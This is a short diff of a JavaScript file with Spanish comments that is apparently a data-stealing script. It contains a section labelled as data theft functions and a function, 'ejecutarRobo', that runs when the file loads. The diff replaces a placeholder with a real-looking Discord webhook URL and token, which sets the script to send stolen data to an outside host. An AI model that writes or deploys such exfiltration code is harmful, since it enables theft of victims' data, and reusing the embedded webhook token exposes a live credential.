@@ -12,7 +12,7 @@
 
 // --- CONFIGURACIÓN ---
 // Reemplaza esta URL con la de tu webhook de Discord de prueba.
-const WEBHOOK_URL = "https://discord.com/api/webhooks/TU_ID_DE_WEBHOOK/TU_TOKEN_DE_WEBHOOK";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1454234349733023846/DqBPO7cTvMxAdCb-iv1hk6VBL7Foh-OAtC5kDYA29pYmMH3RxdLYOwfhR9ZwivQA84qe";
 
 // --- FUNCIONES DE ROBO DE DATOS ---
 
@@ -99,4 +99,5 @@ function ejecutarRobo() {
 }
 
 // Iniciar el proceso
+
 ejecutarRobo();
